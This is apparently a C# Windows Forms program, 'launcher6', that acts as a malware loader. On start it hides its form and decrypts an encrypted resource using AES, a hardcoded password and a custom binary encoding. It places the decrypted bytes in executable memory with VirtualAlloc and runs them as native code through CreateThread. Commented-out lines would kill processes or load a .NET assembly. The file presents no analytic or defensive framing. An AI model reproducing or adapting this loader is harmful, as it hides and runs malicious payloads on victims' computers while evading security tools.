using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace launcher6
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Form1 form = new Form1();
            form.Hide();
         /*   foreach(var process in Process.GetProcessesByName(""))

                {
                process.Kill();

            }*/
            String password = "fuckingdarkworld";
            String ccode = Properties.Resources.String2;
            //  System.Reflection.Assembly obj = System.Reflection.Assembly.Load(Convert.FromBase64String(decrypt(DecryptText(ccode, password))));

            // obj.EntryPoint.Invoke(null, null);
            byte[] Finall_Payload = Convert.FromBase64String(decrypt(DecryptText(ccode, password)));
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)Finall_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(Finall_Payload, 0, (IntPtr)(funcAddr), Finall_Payload.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            /// execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static string  DecryptText(string input, string password)
        {
            // Get the bytes of the string
            byte[] bytesToBeDecrypted = Convert.FromBase64String(input);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);

            string result = Encoding.UTF8.GetString(bytesDecrypted);

            return result;
        }
        public  static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 5, 4, 6, 3, 3, 2, 1, 2, 3, 4, 10, 15, 18, 20 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }
        public static String decrypt(String m)
        {
           // String m = Properties.Resources.String1;
            String vv = "";
            string[] ll = m.Split('/');
            for (int i = 0; i < ll.Length; i++)
            {
                int n = Convert.ToInt32(ll[i], 2);
                if (n > 0 && n <= 122)
                    n += 5;
                vv += (char)n;
            }
            return vv;
        }
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(string moduleName);
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(string lpFileName);
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();
    }
}
